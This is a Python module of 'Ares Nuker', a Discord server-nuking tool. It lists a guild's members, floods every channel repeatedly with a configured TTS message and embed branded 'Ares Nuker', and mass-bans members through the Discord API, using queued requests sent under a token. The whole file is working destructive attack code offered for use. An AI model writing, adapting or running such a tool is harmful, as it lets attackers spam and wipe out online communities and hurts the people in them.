__import__('sys').path.append('../')
import global_vars, requests, json
from .requests_maker import GetQ
from AresNuker import Console
from .channels import GetChannels

console = Console()
q = GetQ()
headers = global_vars.headers
config = global_vars.config
guild_id = global_vars.guild_id

def GetGuildMembers(guild_id) -> None:
	r = requests.get(f"https://discord.com/api/v8/guilds/{guild_id}/members", headers = headers)
	json_members = json.loads(r.text)
	members = []
	for i in range(0, len(json_members) - 1):
		id = json_members[i]['user']['id']
		name = json_members[i]['user']['username']
		bot = json_members[i]['user']['bot']
		members.append({'id': id, 'name': name, 'bot': bot}) 
	return members

def SendMessage() -> None:
	payload = {
		"content": config['message']['content'],
		'tts': True,
		'embeds': [
			{
				'description': config['message.embed']['description'],
				'author': {
					'name': 'Ares Nuker',
					'icon_url': config['message.embed']['icon_url']
				},
				'title': config['message.embed']['title'],
				'color': config['message.embed']['color'],
				'image': {
					'url': config['message.embed']['image_url']
				},
				'footer': {
					'icon_url': config['message.embed']['icon_url'],
					'text': 'Ares Nuker'
				}

			}
		]
	}
	channels = GetChannels(guild_id)
	amount_message = int(config['nuke']['amount_message_per_channel'])
	for i in range(amount_message):
		for channel in channels:
			try:
				q.put((requests.post, f'https://discord.com/api/v8/channels/{channel["id"]}/messages', headers, payload))
				console.log(f'Sent message → {channel["name"]}')
			except Exception as e:
				console.error(f'Unble to send message → {channel["name"]}')

def BanAll() -> None:
	payload = {'delete_message_days':'0', 'reason': config['nuke']['ban_reason']}
	members = GetGuildMembers(guild_id=guild_id)
	for member in members:
		if member != config['discord']['user_id']:
			try:
				q.put((requests.put, f'https://discord.com/api/v8/guilds/{guild_id}/bans/{member["id"]}', headers, payload))
				console.log(f'Baned {member["name"]}')
			except:
				console.error(f'Unble to ban {member["name"]}')

